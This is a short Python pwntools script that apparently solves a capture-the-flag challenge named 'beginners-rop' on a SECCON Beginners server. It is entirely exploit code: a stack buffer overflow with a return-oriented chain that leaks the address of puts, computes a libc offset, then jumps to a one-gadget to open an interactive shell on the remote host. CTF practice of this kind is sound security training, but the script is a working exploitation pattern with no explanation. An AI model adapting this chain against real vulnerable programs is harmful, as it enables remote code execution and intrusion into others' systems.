from pwn import *


def solve():
    context.binary = ELF('./chall')

    io = remote('beginners-rop.quals.beginners.seccon.jp', 4102)

    pop_rdi = 0x401283
    puts_got = 0x404018
    puts_plt = 0x401070
    main = 0x401196

    offset = 0x108
    payload = b''
    payload += b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    io.sendline(payload)
    io.recvline()

    puts_libc = unpack(io.recvline()[:-1].ljust(8, b'\0'))

    payload = b''
    payload += b'A' * offset
    payload += pack(puts_libc - 0x80aa0 + 0x4f3d5)

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    solve()
